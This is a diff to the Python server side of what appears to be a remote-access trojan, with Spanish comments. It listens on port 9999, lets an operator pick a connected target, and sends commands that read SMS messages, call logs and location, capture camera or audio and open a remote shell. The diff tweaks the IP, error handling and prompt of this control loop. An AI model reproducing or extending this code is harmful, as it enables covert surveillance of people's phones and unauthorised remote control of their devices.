@@ -20,7 +20,7 @@ def create_socket():
         global port
         global s
         # Se asigna la ip de la pc servidor
-        host = "192.168.0.15"
+        host = "192.168.100.62"
         # Se utiliza el puerto de acceso 9999 
         port = 9999
         # Se instancia la conexion
@@ -98,6 +98,7 @@ def start_turtle():
             if conn is not None:
                 # En caso de lograr recuperar la conexion se permite enviar comandos
                 send_target_commands(conn)
+                start_turtle()
         elif 'exit' in cmd:   
             # Se rompe el ciclo
             break     
@@ -113,7 +114,7 @@ def list_connections():
         try:
             # Se prueba la conexion enviando y recibiendo datos
             conn.send(str.encode(' '))
-            conn.recv(20480)
+            #conn.recv(20480)
         except:
             # En caso de no generar conexion se la borra de la lista
             del all_connections[i]
@@ -133,7 +134,7 @@ def get_target(cmd):
         conn = all_connections[target]
         print("You are now connected to :" + str(all_address[target][0]))
         # Se ingresa a la terminal seleccionada
-        print(str(all_address[target][0]) + ">", end="")
+        #print(str(all_address[target][0]) + ">", end="")
         # Se retorna la conexion
         return conn
         # 192.168.0.4> dir
@@ -146,45 +147,46 @@ def get_target(cmd):
 # Se envia los mensajes entre cliente servidor
 def send_target_commands(conn):
     while True:
-        try:
-            # Se pone en escucha el socket
-            msg = conn.recv(4024).decode("UTF-8")
-            # Estas son las acciones a realizar como respuesta 
-            # del mensaje que mandemos
-            if(msg.strip() == "IMAGE"):
-                getImage(conn)
-            elif("readSMS" in msg.strip()):
-                content = msg.strip().split(" ")
-                data = content[1]
-                readSMS(conn,data)
-            elif(msg.strip() == "SHELL"):
-                shell(conn)
-            elif(msg.strip() == "getLocation"):
-                getLocation(conn)
-            elif(msg.strip() == "stopVideo123"):
-                stopVideo(conn)
-            elif(msg.strip() == "stopAudio"):
-                stopAudio(conn)
-            elif(msg.strip() == "callLogs"):
-                callLogs(conn)
-            elif(msg.strip() == "help"):
-                help()
-            else:
-                print(msg)
-            # Caputramos los datos escritos    
-            cmd = input()
-            # Se envia el mensaje
-            conn.send(cmd.encode("UTF-8"))
-            # En caso de querer terminar 
-            if cmd.strip() == "exit":
-                print(" ")
-                print("Bye")
-                sys.exit()
-            if(cmd.strip() == "clear"):clear()
-        except:
+        #try:
+        # Se pone en escucha el socket
+        msg = conn.recv(4024).decode("UTF-8")
+        # Estas son las acciones a realizar como respuesta 
+        # del mensaje que mandemos
+        if(msg.strip() == "IMAGE"):
+            getImage(conn)
+        elif("readSMS" in msg.strip()):
+            content = msg.strip().split(" ")
+            data = content[1]
+            readSMS(conn,data)
+        elif(msg.strip() == "SHELL"):
+            shell(conn)
+        elif(msg.strip() == "getLocation"):
+            getLocation(conn)
+        elif(msg.strip() == "stopVideo123"):
+            stopVideo(conn)
+        elif(msg.strip() == "stopAudio"):
+            stopAudio(conn)
+        elif(msg.strip() == "callLogs"):
+            callLogs(conn)
+        elif(msg.strip() == "help"):
+            help()
+        else:
+            print(msg)
+        # Caputramos los datos escritos    
+        cmd = input(Style.BRIGHT+Fore.CYAN+"Interpreter:/> "+Fore.RESET)+"\n"
+       
+        # Se envia el mensaje
+        conn.send(cmd.encode("UTF-8"))
+        # En caso de querer terminar 
+        if cmd.strip() == "exit":
+            print(" ")
+            print("Bye")
+            sys.exit()
+        if(cmd.strip() == "clear"):clear()
+        """ except:
             # Mostramos el error
             print("Error sending commands")
-            break
+            break """
 
 
 # Creamos los hilos para los subprocesos
@@ -216,5 +218,4 @@ def create_jobs():
     # Se crea los trabajos a iniciar en la cola
     for x in JOB_NUMBER:
         queue.put(x)
-
     queue.join()
